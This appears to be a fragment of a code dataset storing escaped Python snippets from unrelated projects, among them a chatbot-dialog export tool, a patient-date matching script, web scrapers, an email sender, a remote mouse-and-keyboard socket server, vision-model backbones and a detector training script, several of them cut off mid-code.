\u0437\u0430\u043f\u0443\u0449\u0435\u043d\u043e')\n            else:\n                st.warning('\u0427\u0442\u043e \u0442\u043e \u043f\u043e\u0448\u043b\u043e \u043d\u0435 \u0442\u0430\u043a')\n                st.write(r)\n    elif target_type == by_date:\n        today = datetime.now()\n        week_ago = today  - timedelta(7)\n        (date_range_from, date_range_to) = st.date_input(\n            \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u043d\u0438, \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u044b\u043c \u0431\u0443\u0434\u0443\u0442 \u0432\u044b\u0431\u0440\u0430\u043d\u044b \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u0435 \u0431\u0435\u0441\u0435\u0434\u044b\",\n            (week_ago, today),\n            week_ago,\n            today,\n            format=\"DD.MM.YYYY\",\n        )\n\n        if run_submited := st.button('\u041d\u0430\u0439\u0442\u0438 \u0431\u0435\u0441\u0435\u0434\u044b'):\n\n            export_url = base_url + '/api/v1/dialogs/export'\n            export_payload = {\n                'agentStageId': bot_id,\n                'status': 'Active',\n                'latestMessageFromDate': date_range_from.strftime('%Y-%m-%d'),\n                'latestMessageToDate': date_range_to.strftime('%Y-%m-%d')\n            }\n            load_placeholder = st.empty()\n            load_placeholder.text('\u042d\u043a\u0441\u043f\u043e\u0440\u0442\u0438\u0440\u0443\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0431\u0435\u0441\u0435\u0434')\n            load_placeholder.write(export_payload)\n            r = requests.post(export_url, json=export_payload, headers={\"X-Token\": xtoken, 'Content-Type': 'application/json'})\n            \n            if r.status_code != 200:\n                st.warning('\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u044d\u043a\u0441\u043f\u043e\u0440\u0442')\n                st.write(r)\n                st.stop()\n            request_id = r.json()['requestId']\n\n            check_status_url = base_url + '/api/v1/dialogs/export/status/' + request_id\n            while True:\n                r = requests.get(check_status_url, headers={\"X-Token\": xtoken} ).json()\n                status = r['status']\n                if status == 'Success':\n                    file_url = r['fileUrl']\n                   ",
    "import pandas as pd \nimport os \nfrom datetime import timedelta,datetime\n''' \n    # 1.Leer el archivo ---DONE\n    # 2.Reconocer de alguna manera todas las hoja que se tengan y cual es la bandera ---DONE \n    # 3.Buscar hoja x hoja todas las filas de ese paciente ---DONE\n    # 4.Obtener las fechas de cada hoja ---DONE\n    # 5.Comparar cada una de las fechas de la tabla bandera con cada una de las demas  --DONE\n    # 6.Validar las fechas si estan en un rango de 60 dias o no ---DONE\n    # 7.1.Si exition alguna fecha que me sirva entonces busco los datos del paciente que pertenezcan a esa fila... ---DONE\n    # 8.1.Guardar esa fila ---DONE\n    # 7.2.Si la primera fecha bandera no me sirvio con ninguna de las demas de las tablas entonces... ---DONE\n    # 8.2.Paso a la siguiente fecha bandera y esa fecha anterior ya no formara parte de mis datos ---DONE\n    # 9.2.Seguir hasta que las fechas banderas del paciente se acaben  ---DONE\n    # 10. Tomar esa fila buena y guardarla en un nuevo Data Frame  ---DONE\n    # 11. Cuando se termine de iterar sobre todos los pacientes, se validara si esxiste un archivo donde guardar la informacion\n    # 12.1 Si esciste se carga el archivo, convierte en Data Frame y se concatena con el anterior\n    # 12.2. Si no existe entonces solo se crea uno nuevo\n    # Fin del programa\n'''\n\n\n# ----------------------------------------------------------\n# Services \nclass Sheet():\n    '''\n    Clase para instansear e abstraer los metodos mas usados con respecto a cada hoja \n    '''\n    def __init__(self,file,number):\n        self.file = file\n        # Se accede a cada clave del diccionario file para determinar el nombre de la hoja\n        self.name = list(file.keys())[number]\n\n    def get_sheet(self):\n        # Obtener la hoja \n        sheet = self.file[self.name]\n        return sheet\n\n    def get_columns(self,patient_rid,column):\n        # Obtener columna \n        sheet = self.get_sheet()\n        data = sheet.loc [ sheet['RID'] == patient_rid,column ]\n        return data \n\n    def get_rows(self,patient_rid):\n        # Obtener fila \n        try:\n            sheet = self.get_sheet()\n            rows = sheet.loc [ sheet['RID'] == patient_rid]\n            return rows\n        except Exception as e:\n            print(e)\n\n    def __str__(self):\n        return self.name\n    \ndef sheet_generator(file,flag_sheet ):\n    '''\n    Un generador de hojas que itera todas las hojas de un archivo menos la hoja bandera\n    '''\n    for index,sheet in enumerate(file.values()):\n        # retornamos la hoja siguiente del archivo mientras no sea la bandera\n        if not sheet.equals(flag_sheet) :\n            # Se crea una instacia de la clase Sheet para cada hoja\n            current_sheet = Sheet(file, index)\n            yield current_sheet \n\ndef drop_row(data,file):\n    '''\n    Elimina la fila de la hoja basado en un diccionario con los datos\n    y el archivo que contiene todas las hojas.\n    Se itera cada elemento del diccionario y se obtiene el nombre de la hoja como clave y su id como valor.\n    Retorna el archivo con cada una de sus hojas sin las columnas \n    '''\n    for sheet_name,id in data.items():\n        # Se accede a la hoja actual\n        sheet_df = file[sheet_name]\n        # De la hoja actual se borra la fila que contenga el id que se desempaqueto antes\n        # Luego se guarda en la hoja del archivo para que los cambios sean permanentes \n        file[sheet_name] = sheet_df.drop(sheet_df[sheet_df['INDEX'] == id].index)\n    return file\n\ndef ask_filter_options():\n    '''\n    Esta funcion solo se encarga de mostrar y preguntar al usuario si desea\n    parte del archivo existente antes de trabajar con el o no.\n    Retorna una tupla con:\n    1.La columna por la cual se realizara el filtrado,\n    2.La condicion ej:(<=,>,==,etc),\n    3.El numero por el cual se tendra en cuenta para filtrar\n    '''\n    # Aqui se pregunta la columna x la cual se va a filtrar.\n    # Puede ser 'RID','EXAMDATE' cualquier columna que sea comun en todas las hojas por supuesto\n    column: str = input(\"Que columna desea usar para filtrar: \")\n    print(\"Que opcion desea para filtrar:\")\n    options = {\n        \"1\": \"mayor que\",\n        \"2\": \"mayor igual que\",\n        \"3\": \"menor que\",\n        \"4\": \"menor igual que\",\n        \"5\": \"igual que\",\n    }\n    # Este ciclo solo recorre el diccionarion de 'options' para mostrar cada una de las opciones\n    for key, value in options.items():\n        print(f\"{key} : {value} \")\n    response = input(\"Elijo la opcion :\")\n    condition = options[response]\n    # Revisa si el usuario quiere filtrar por fechas \n    if column == 'EXAMDATE':\n        # Pide la fecha y muestra ejemplos de como insertarla\n        number = input(f\"Desea todas las columnas {condition} formato de fecha debe ser 'mm-dd-aaaa'ej.(08-24-2012): \")\n        # Trasforma el string recibido en uan fecha valida para trabajar\n        number = datetime.strptime(number, '%m-%d-%Y')\n    else:\n        # Se pregunta el numero que el usuario escogio\n    ",
    "import torch\nfrom torch import nn\nfrom torchvision import models\n\nclass ResNet(nn.Module):\n    def __init__(self, out_dim, fix_params=False, running_stats=False, pretrained = False):\n        super().__init__()\n        self.out_dim = out_dim\n        self.resnet = models.resnet18(pretrained  = pretrained )\n        if fix_params:\n            for param in self.resnet.parameters():\n                param.requires_grad = False\n\n        self.resnet.fc = nn.Linear(self.resnet.fc.in_features, out_dim)\n        self.bn_stats(running_stats)\n        \n    def forward(self, x):\n        return self.resnet(x)\n\n    def bn_stats(self, track_running_stats):\n        for m in self.modules():\n            if type(m) == nn.BatchNorm2d:\n                m.track_running_stats = track_running_stats\n\nclass FeatureExtractor(nn.Module):\n    def __init__(self):\n        super(FeatureExtractor, self).__init__()\n        self.cnn_fdim = 512 \n        self.cnn = ResNet(self.cnn_fdim, running_stats=False, pretrained=True)\n        # If freeze the CNN params \n        for param in self.cnn.parameters():\n            param.requires_grad = False\n       \n    def to(self, device):\n        self.device = device\n        super().to(device)\n        return self\n    \n    def forward(self, data):\n        # pose: 69 dim body pose\n        batch_size, seq_len, _, _, _ = data['of'].shape # \n\n        of_data = data['of'] # B X T X 224 X 224 X 2 \n        of_data = torch.cat((of_data, torch.zeros(of_data.shape[:-1] + (1,), device=of_data.device)), dim=-1)\n        h, w = 224, 224 \n        c = 3\n        of_data = of_data.reshape(-1, h, w, c).permute(0, 3, 1, 2) # B X T X 3 X 224 X 224 \n        input_features = self.cnn(of_data).reshape(batch_size, seq_len, self.cnn_fdim) # B X T X D \n\n        return input_features \n\nif __name__ == '__main__':\n    net = ResNet(128)\n    input = ones(1, 3, 224, 224)\n    out = net(input)\n    print(out.shape)\n",
    "import requests\nfrom bs4 import BeautifulSoup\nimport rumps\n\ndef get_live_scores():\n   \n    url = \"https://www.cricbuzz.com/\"\n\n    response = requests.get(url)\n    soup = BeautifulSoup(response.text, 'html.parser')\n    score_elements = soup.find_all(\"div\", class_=\"cb-ovr-flo\")\n\n    team1 = score_elements[1].text.strip()  \n    score1 = score_elements[2].text.strip() \n    team2 = score_elements[3].text.strip()  \n    score2 = score_elements[4].text.strip()  \n    match_status = score_elements[5].text.strip() \n\n    return team1, score1, team2, score2, match_status\n\nclass LiveCricketScoresApp(rumps.App):\n    def __init__(self):\n        super(LiveCricketScoresApp, self).__init__(\"Live Cricket Scores\")\n        self.menu = [\"Refresh\", rumps.separator]\n        self.refresh_scores()  \n        rumps.timer(30)(self.refresh_scores)  \n\n    @rumps.clicked(\"Refresh\")\n    def refresh_scores(self, _=None):\n        team1, score1, team2, score2, match_status = get_live_scores()\n        self.title = f\"{team1}: {score1} vs {team2}: {score2} ({match_status})\"\n\nif __name__ == '__main__':\n    LiveCricketScoresApp().run()\n",
    "from bs4 import BeautifulSoup\r\nimport requests\r\nimport os\r\nfrom urllib.parse import urljoin\r\n\r\nurl = \"https://en.wikipedia.org/wiki/Python_(programming_language)\"\r\nresponse = requests.get(url)  # HTML sayfas\u0131 i\u00e7in istek at\u0131yoruz\r\n\r\nsoup = BeautifulSoup(response.text, \"html.parser\")  # HTML sayfas\u0131n\u0131 par\u00e7al\u0131yoruz\r\n\r\ntitle = soup.title.string  # Sayfan\u0131n ba\u015fl\u0131\u011f\u0131n\u0131 al\u0131yoruz\r\nprint(title)\r\n\r\n# Sayfan\u0131n ilk paragraf\u0131n\u0131 al\u0131yoruz\r\nilk_paragraf = soup.find_all(\"p\")[0].text \r\nprint(\"\u0130lk Paragraf:\", ilk_paragraf)\r\n\r\nfor paragraf in soup.find_all(\"p\"):  # T\u00fcm paragraflar\u0131 al\u0131yoruz\r\n    print(paragraf.text)  # Paragraflar\u0131 yazd\u0131r\u0131yoruz\r\n\r\n# \u0130\u00e7indekiler b\u00f6l\u00fcm\u00fcn\u00fc al\u0131yoruz (Bu site i\u00e7in muhtemelen \u00e7al\u0131\u015fmayacak)\r\ncontents = soup.select('#toc')\r\nfor item in contents:\r\n    print(item.text)\r\n\r\n# T\u00fcm tablolar\u0131 ve i\u00e7eriklerini yazd\u0131r\u0131yoruz\r\ntables = soup.find_all(\"table\")\r\nfor table in tables:\r\n    table_title = table.caption.text if table.caption else \"Tablo ba\u015fl\u0131\u011f\u0131 yok\"\r\n    print(\"Tablo Ba\u015fl\u0131\u011f\u0131:\", table_title)\r\n    rows = table.find_all(\"tr\")\r\n    for row in rows:\r\n        cells = row.find_all([\"td\", \"th\"])\r\n        for cell in cells:\r\n            print(cell.text.strip(), end=\"\\t\")\r\n        print(\"\")  # Her sat\u0131rdan sonra yeni bir sat\u0131ra ge\u00e7\r\n\r\nimages = soup.find_all(\"img\")\r\nos.makedirs(\"downloaded_images\", exist_ok=True)\r\nfor index, image in enumerate(images):\r\n    image_url = image[\"src\"]  # Resmin URL'sini al\u0131yoruz\r\n    if image_url.startswith(\"//\"):\r\n        image_url = \"https:\" + image_url\r\n    if not image_url.startswith((\"http://\", \"https://\")):\r\n        image_url = urljoin(url, image_url)\r\n    image_response = requests.get(image_url)  # Her resim i\u00e7in ayr\u0131 bir istek at\u0131yoruz\r\n    with open(f\"downloaded_images/image_{index}.jpg\", \"wb\") as file:\r\n        file.write(image_response.content)  # Resmin i\u00e7eri\u011fini dosyaya yaz\u0131yoruz\r\n    alt_text = image.get(\"alt\", \"alternatif metin yok\")\r\n    print(f\"Resim {index} URL'si: {image_url}\")\r\n    print(f\"Resim {index} alternatif metin: {alt_text}\")\r\n    print(f\"Resim {index} indirildi\\n\" + \"-\"*50 + \"\\n\")\r\n",
    "import smtplib\nimport ssl\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# Sender and receiver email addresses\nsender = [\"myemail@gmail.com\", \"aaaa bbbb cccc dddd\"]\nreceiver_email = \"receiver_email\"\n\n# Function to send email\ndef sendEmail(to, sender_email, password):\n    # Create a multipart message\n    message = MIMEMultipart(\"alternative\")\n    message[\"Subject\"] = \"Write Your Subject Here\"\n    message[\"From\"] = \"Name of the sender\"\n    message[\"To\"] = to\n    message[\"Importance\"] = \"high\"  # Set the importance level\n\n    # HTML content of the email\n    html = \"\"\"\n        <!DOCTYPE html>\n        <html lang=\"en\">\n        <head>\n            <meta charset=\"UTF-8\">\n            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n            <title>Email Sample</title>\n        </head>\n        <body>\n            <div>\n                <h1>Hello</h1>\n                <h3>how are you?</h3>\n            </div>\n        </body>\n        </html>\"\"\"\n        \n    # Create a MIMEText object with the HTML content\n    part2 = MIMEText(html, \"html\")\n    message.attach(part2)\n\n    # Create a secure SSL context\n    context = ssl.create_default_context()\n\n    # Connect to the SMTP server and send the email\n    with smtplib.SMTP_SSL(\"smtp.gmail.com\", 465, context=context) as server:\n        try:\n            # Login to the server using the sender's email and password\n            server.login(sender_email, password)\n            \n            # Send the email\n            server.sendmail(sender_email, to, message.as_string())\n            \n            # Print a success message\n            print(f\"Email sent successfully to {to}\")\n        except smtplib.SMTPAuthenticationError as e:\n            # Handle authentication errors\n            print(f\"SMTP Authentication Error: {e}\")\n            print(\"Check username, password, and 'Less Secure Apps' access.\")\n        except Exception as e:\n            # Handle other exceptions\n            print(f\"An error occurred: {e}\")\n\n# Call the sendEmail function with the receiver email, sender's email, and password\nsendEmail(receiver_email, sender[0], sender[1])\n\n# Copyright information\n\"\"\"\nAuthor: KHAOUITI ABDELHAKIM\nGitHub: @khaouitiabdelhakim\n\"\"\" \n",
    "import socket\r\nimport pyautogui\r\nimport keyboard\r\n\r\ndef start_server(host, port):\r\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    server_socket.bind((host, port))\r\n    server_socket.listen(1)\r\n    print(\"Server listening on port\", port)\r\n    conn, addr = server_socket.accept()\r\n    print(\"Connected to:\", addr)\r\n\r\n    while True:\r\n        try:\r\n            data = conn.recv(1024).decode()\r\n            if not data:\r\n                break\r\n            if ',' in data:\r\n                x, y, *button = data.split(',')\r\n                pyautogui.moveTo(int(x), int(y))\r\n                if button and button[0] == 'L':\r\n                    pyautogui.click()\r\n            else:\r\n                keyboard.write(data)\r\n        except Exception as e:\r\n            print(\"Error:\", e)\r\n            break\r\n\r\n    conn.close()\r\n    server_socket.close()\r\n\r\nif __name__ == \"__main__\":\r\n    host = '172.24.96.1'  # Bind to all available network interfaces\r\n    port = 9999  # Choose an available port\r\n    start_server(host, port)\r\n",
    "import torch\nimport torch.nn as nn\nimport timm\nimport types\nimport math\nimport torch.nn.functional as F\n\nfrom .utils import (activations, forward_adapted_unflatten, get_activation, get_readout_oper,\n                    make_backbone_default, Transpose)\n\n\ndef forward_vit(pretrained, x):\n    return forward_adapted_unflatten(pretrained, x, \"forward_flex\")\n\n\ndef _resize_pos_embed(self, posemb, gs_h, gs_w):\n    posemb_tok, posemb_grid = (\n        posemb[:, : self.start_index],\n        posemb[0, self.start_index:],\n    )\n\n    gs_old = int(math.sqrt(len(posemb_grid)))\n\n    posemb_grid = posemb_grid.reshape(1, gs_old, gs_old, -1).permute(0, 3, 1, 2)\n    posemb_grid = F.interpolate(posemb_grid, size=(gs_h, gs_w), mode=\"bilinear\")\n    posemb_grid = posemb_grid.permute(0, 2, 3, 1).reshape(1, gs_h * gs_w, -1)\n\n    posemb = torch.cat([posemb_tok, posemb_grid], dim=1)\n\n    return posemb\n\n\ndef forward_flex(self, x):\n    b, c, h, w = x.shape\n\n    pos_embed = self._resize_pos_embed(\n        self.pos_embed, h // self.patch_size[1], w // self.patch_size[0]\n    )\n\n    B = x.shape[0]\n\n    if hasattr(self.patch_embed, \"backbone\"):\n        x = self.patch_embed.backbone(x)\n        if isinstance(x, (list, tuple)):\n            x = x[-1]  # last feature if backbone outputs list/tuple of features\n\n    x = self.patch_embed.proj(x).flatten(2).transpose(1, 2)\n\n    if getattr(self, \"dist_token\", None) is not None:\n        cls_tokens = self.cls_token.expand(\n            B, -1, -1\n        )  # stole cls_tokens impl from Phil Wang, thanks\n        dist_token = self.dist_token.expand(B, -1, -1)\n        x = torch.cat((cls_tokens, dist_token, x), dim=1)\n    else:\n        if self.no_embed_class:\n            x = x + pos_embed\n        cls_tokens = self.cls_token.expand(\n            B, -1, -1\n        )  # stole cls_tokens impl from Phil Wang, thanks\n        x = torch.cat((cls_tokens, x), dim=1)\n\n    if not self.no_embed_class:\n        x = x + pos_embed\n    x = self.pos_drop(x)\n\n    for blk in self.blocks:\n        x = blk(x)\n\n    x = self.norm(x)\n\n    return x\n\n\ndef _make_vit_b16_backbone(\n    model,\n    features=[96, 192, 384, 768],\n    size=[384, 384],\n    hooks=[2, 5, 8, 11],\n    vit_features=768,\n    use_readout=\"ignore\",\n    start_index=1,\n    start_index_readout=1,\n):\n    pretrained = make_backbone_default(model, features, size, hooks, vit_features, use_readout, start_index,\n                                       start_index_readout)\n\n    # We inject this function into the VisionTransformer instances so that\n    # we can use it with interpolated position embeddings without modifying the library source.\n    pretrained.model.forward_flex = types.MethodType(forward_flex, pretrained.model)\n    pretrained.model._resize_pos_embed = types.MethodType(\n        _resize_pos_embed, pretrained.model\n    )\n\n    return pretrained\n\n\ndef _make_pretrained_vitl16_384(pretrained, use_readout=\"ignore\", hooks=None):\n    model = timm.create_model(\"vit_large_patch16_384\", pretrained=pretrained)\n\n    hooks = [5, 11, 17, 23] if hooks == None else hooks\n    return _make_vit_b16_backbone(\n        model,\n        features=[256, 512, 1024, 1024],\n        hooks=hooks,\n        vit_features=1024,\n        use_readout=use_readout,\n    )\n\n\ndef _make_pretrained_vitb16_384(pretrained, use_readout=\"ignore\", hooks=None):\n    model = timm.create_model(\"vit_base_patch16_384\", pretrained=pretrained)\n\n    hooks = [2, 5, 8, 11] if hooks == None else hooks\n    return _make_vit_b16_backbone(\n        model, features=[96, 192, 384, 768], hooks=hooks, use_readout=use_readout\n    )\n\n\ndef _make_vit_b_rn50_backbone(\n    model,\n    features=[256, 512, 768, 768],\n    size=[384, 384],\n    hooks=[0, 1, 8, 11],\n    vit_features=768,\n    patch_size=[16, 16],\n    number_stages=2,\n    use_vit_only=False,\n    use_readout=\"ignore\",\n    start_index=1,\n):\n    pretrained = nn.Module()\n\n    pretrained.model = model\n\n    used_number_stages = 0 if use_vit_only else number_stages\n    for s in range(used_number_stages):\n        pretrained.model.patch_embed.backbone.stages[s].register_forward_hook(\n            get_activation(str(s + 1))\n        )\n    for s in range(used_number_stages, 4):\n        pretrained.model.blocks[hooks[s]].register_forward_hook(get_activation(str(s + 1)))\n\n    pretrained.activations = activations\n\n    readout_oper = get_readout_oper(vit_features, features, use_readout, start_index)\n\n    for s in range(used_number_stages):\n        value = nn.Sequential(nn.Identity(), nn.Identity(), nn.Identity())\n        exec(f\"pretrained.act_postprocess{s + 1}=value\")\n    for s in range(used_number_stages, 4):\n        if s < number_stages:\n            final_layer = nn.ConvTranspose2d(\n                in_channels=features[s],\n                out_channels=features[s],\n                kernel_size=4 // (2 ** s),\n                stride=4 // (2 ** s),\n                padding=0,\n                bias=True,\n                dilation=1,\n                groups=1,\n            )\n        elif s > number_stages:\n            ",
    "from pprint import pprint\nfrom typing import Any,Callable\n\nclass TailOp:\n    \"\"\"\n    A class representing an End-of-Line operator for quick and easy operations at the end of a line.\n    \n    Attributes:\n        f (Callable): The function or callable to be executed with | operator.\n        f_args (tuple): The arguments to be passed to the function.\n        f_kwargs (dict): The keyword arguments to be passed to the function.\n    \"\"\"\n\n    def __init__(self, f, *args: Any, **kwargs: Any):\n        self.f: Callable = f\n        self.f_args = args\n        self.f_kwargs = kwargs\n\n    def __or__(self, other):\n        \"\"\"\n        Defines the behavior of the | operator with TailOp objects.\n        Executes self.f\n        \"\"\"\n        try:\n            return self.f(other, *self.f_args, **self.f_kwargs)\n        except TypeError:\n            print(\"TailOp Error\")\n            return other\n\n    def __call__(self, *args: Any, **kwargs: Any) -> Any:\n        \"\"\"\n        Allows the TailOp to be called with arguments.\n        tailprint(width=3)\n        \"\"\"\n        self.f_args = args\n        self.f_kwargs = kwargs\n        return self\n    \ntailprint = TailOp(pprint)\n\n",
    "# repototext.py\n\"\"\"\nThis module handles the back end flask server for RepoToText\n\"\"\"\n\n# pylint: disable=line-too-long\n# pylint: disable=C0103\n\nimport os\nfrom datetime import datetime\nimport re\nfrom github import Github, RateLimitExceededException\nfrom bs4 import BeautifulSoup\nimport requests\nfrom flask import Flask, request, jsonify\nfrom flask_cors import CORS\nfrom requests.exceptions import RequestException\nfrom retry import retry\n\napp = Flask(__name__)\nCORS(app, resources={r\"/scrape\": {\"origins\": \"https://devbot.hellopartage.xyz\"}})\n\nclass GithubRepoScraper:\n    \"\"\"Scrape GitHub repositories.\"\"\"\n    def __init__(self, repo_name, doc_link=None, selected_file_types=None):\n        if selected_file_types is None:\n            selected_file_types = []\n        self.github_api_key = os.getenv(\"GITHUB_API_KEY\")\n        self.repo_name = repo_name\n        self.doc_link = doc_link\n        self.selected_file_types = selected_file_types\n\n    @retry(RateLimitExceededException, tries=5, delay=2, backoff=2)\n    def fetch_all_files(self):\n        \"\"\"Fetch all files from the GitHub repository.\"\"\"\n        def recursive_fetch_files(repo, contents):\n            files_data = []\n            for content_file in contents:\n                if content_file.type == \"dir\":\n                    files_data += recursive_fetch_files(repo, repo.get_contents(content_file.path))\n                else:\n                    # Check if file type is in selected file types\n                    if any(content_file.name.endswith(file_type) for file_type in self.selected_file_types):\n                        file_content = \"\"\n                        file_content += f\"\\n'''--- {content_file.path} ---\\n\"\n\n                        if content_file.encoding == \"base64\":\n                            try:\n                                file_content += content_file.decoded_content.decode(\"utf-8\")\n                            except UnicodeDecodeError: # catch decoding errors\n                                file_content += \"[Content not decodable]\"\n                        elif content_file.encoding == \"none\":\n                            # Handle files with encoding \"none\" here\n                            print(f\"Warning: Skipping {content_file.path} due to unsupported encoding 'none'.\")\n                            continue\n                        else:\n                            # Handle other unexpected encodings here\n                            print(f\"Warning: Skipping {content_file.path} due to unexpected encoding '{content_file.encoding}'.\")\n                            continue\n\n                        file_content += \"\\n'''\"\n                        files_data.append(file_content)\n            return files_data\n\n        github_instance = Github(self.github_api_key)\n        repo = github_instance.get_repo(self.repo_name)\n        contents = repo.get_contents(\"\")\n        files_data = recursive_fetch_files(repo, contents)\n        return files_data\n\n    def scrape_doc(self):\n        \"\"\"Scrape webpage.\"\"\"\n        if not self.doc_link:\n            return \"\"\n        try:\n            page = requests.get(self.doc_link, timeout=10)\n            soup = BeautifulSoup(page.content, 'html.parser')\n            return soup.get_text(separator=\"\\n\")\n        except RequestException as e:\n            print(f\"Error fetching documentation: {e}\")\n            return \"\"\n\n    def write_to_file(self, files_data):\n        \"\"\"Built .txt file with all of the repo's files\"\"\"\n        timestamp = datetime.now().strftime(\"%Y%m%d%H%M%S\")\n        filename = f\"/data/{self.repo_name.replace('/', '_')}_{timestamp}.txt\"\n        with open(filename, \"w\", encoding='utf-8') as f:\n            doc_text = self.scrape_doc()\n            if doc_text:\n                f.write(f\"Documentation Link: {self.doc_link}\\n\\n\")\n                f.write(f\"{doc_text}\\n\\n\")\n            f.write(f\"*GitHub Repository \\\"{self.repo_name}\\\"*\\n\")\n            for file_data in files_data:\n                f.write(file_data)\n        return filename\n\n    def clean_up_text(self, filename):\n        \"\"\"Remove line breaks after 2.\"\"\"\n        with open(filename, 'r', encoding='utf-8') as f:\n            text = f.read()\n        cleaned_text = re.sub('\\n{3,}', '\\n\\n', text)\n        with open(filename, 'w', encoding='utf-8') as f:\n            f.write(cleaned_text)\n\n    def run(self):\n        \"\"\"Run RepoToText.\"\"\"\n        print(\"Fetching all files...\")\n        files_data = self.fetch_all_files()\n\n        print(\"Writing to file...\")\n        filename = self.write_to_file(files_data)\n\n        print(\"Cleaning up file...\")\n        self.clean_up_text(filename)\n\n        print(\"Done.\")\n        return filename\n\n@app.route('/scrape', methods=['POST'])\ndef scrape():\n    \"\"\"Scrape GitHub repositories.\"\"\"\n    data = request.get_json()\n\n    repo_url = data.get('repoUrl')\n    doc_url = data.get('docUrl')\n    selected_file_types = data.get('selectedFileTypes', [])\n\n    if not repo_url:\n        return jsonify({\"error\": \"Repo URL not provided.\"}), 400\n\n    repo_name",
    "# Copyright (c) OpenMMLab. All rights reserved.\n# Author: hjc\n# Written: build_load_teacher\n# OverWritten: main\nimport argparse\nimport copy\nimport os\nimport os.path as osp\nimport time\nimport warnings\n\nimport mmcv\nimport torch\nimport torch.distributed as dist\nfrom mmcv import Config, DictAction\nfrom mmcv.runner import get_dist_info, init_dist, load_checkpoint\nfrom mmcv.utils import get_git_hash\nfrom mmdet import __version__\nfrom mmdet.apis import init_random_seed, set_random_seed\n\nfrom mmrotate.apis import train_detector, train_detector_wKD\nfrom mmrotate.datasets import build_dataset\nfrom mmrotate.models import build_detector\nfrom mmrotate.utils import (collect_env, get_device, get_root_logger,\n                            setup_multi_processes)\n\n\ndef parse_args():\n    parser = argparse.ArgumentParser(description='Train a detector')\n    parser.add_argument('config', help='train config file path')\n    parser.add_argument('--work-dir', help='the dir to save logs and models')\n    parser.add_argument(\n        '--resume-from', help='the checkpoint file to resume from')\n    parser.add_argument(\n        '--auto-resume',\n        action='store_true',\n        help='resume from the latest checkpoint automatically')\n    parser.add_argument(\n        '--no-validate',\n        action='store_true',\n        help='whether not to evaluate the checkpoint during training')\n    group_gpus = parser.add_mutually_exclusive_group()\n    group_gpus.add_argument(\n        '--gpus',\n        type=int,\n        help='number of gpus to use '\n        '(only applicable to non-distributed training)')\n    group_gpus.add_argument(\n        '--gpu-ids',\n        type=int,\n        nargs='+',\n        help='ids of gpus to use '\n        '(only applicable to non-distributed training)')\n    parser.add_argument('--seed', type=int, default=None, help='random seed')\n    parser.add_argument(\n        '--diff-seed',\n        action='store_true',\n        help='Whether or not set different seeds for different ranks')\n    parser.add_argument(\n        '--deterministic',\n        action='store_true',\n        help='whether to set deterministic options for CUDNN backend.')\n    parser.add_argument(\n        '--cfg-options',\n        nargs='+',\n        action=DictAction,\n        help='override some settings in the used config, the key-value pair '\n        'in xxx=yyy format will be merged into config file. If the value to '\n        'be overwritten is a list, it should be like key=\"[a,b]\" or key=a,b '\n        'It also allows nested list/tuple values, e.g. key=\"[(a,b),(c,d)]\" '\n        'Note that the quotation marks are necessary and that no white space '\n        'is allowed.')\n    parser.add_argument(\n        '--launcher',\n        choices=['none', 'pytorch', 'slurm', 'mpi'],\n        default='none',\n        help='job launcher')\n    parser.add_argument('--local_rank', type=int, default=0)\n    args = parser.parse_args()\n    if 'LOCAL_RANK' not in os.environ:\n        os.environ['LOCAL_RANK'] = str(args.local_rank)\n\n    return args\n\ndef build_load_teacher(t_cfg, t_ckpt):\n    \"\"\"\n        Args:\n            t_cfg: str\n            t_ckpt: str\n        Return: \n            teacher: model\n    \"\"\"\n    teacher_cfg = Config.fromfile(t_cfg)  # type: Config\n    # build teacher\n    teacher = build_detector(\n        teacher_cfg.model,\n        train_cfg=teacher_cfg.get('train_cfg'),\n        test_cfg=teacher_cfg.get('test_cfg')\n    )\n    # load teacher\n    load_checkpoint(teacher, t_ckpt, map_location=\"cpu\")\n    # freeze teacher\n    teacher.eval()\n    for m in teacher.modules():\n        for param in m.parameters():\n            param.requires_grad = False\n    \n    return teacher\n\ndef main():\n    args = parse_args()\n\n    cfg = Config.fromfile(args.config)\n    if args.cfg_options is not None:\n        cfg.merge_from_dict(args.cfg_options)\n\n    # set multi-process settings\n    setup_multi_processes(cfg)\n\n    # set cudnn_benchmark\n    if cfg.get('cudnn_benchmark', False):\n        torch.backends.cudnn.benchmark = True\n\n    # work_dir is determined in this priority: CLI > segment in file > filename\n    if args.work_dir is not None:\n        # update configs according to CLI args if args.work_dir is not None\n        cfg.work_dir = args.work_dir\n    elif cfg.get('work_dir', None) is None:\n        # use config filename as default work_dir if cfg.work_dir is None\n        cfg.work_dir = osp.join('./work_dirs',\n                                osp.splitext(osp.basename(args.config))[0])\n    if args.resume_from is not None:\n        cfg.resume_from = args.resume_from\n    cfg.auto_resume = args.auto_resume\n    if args.gpu_ids is not None:\n        cfg.gpu_ids = args.gpu_ids\n    else:\n        cfg.gpu_ids = range(1) if args.gpus is None else range(args.gpus)\n\n    # init distributed env first, since logger depends on the dist info.\n    if args.launcher == 'none':\n        distributed = False\n        if len(cfg.gpu_ids) > 1:\n            warnings.warn(\n                f'We treat {cfg.gpu_ids} as gpu-ids, and reset to '\n    ",
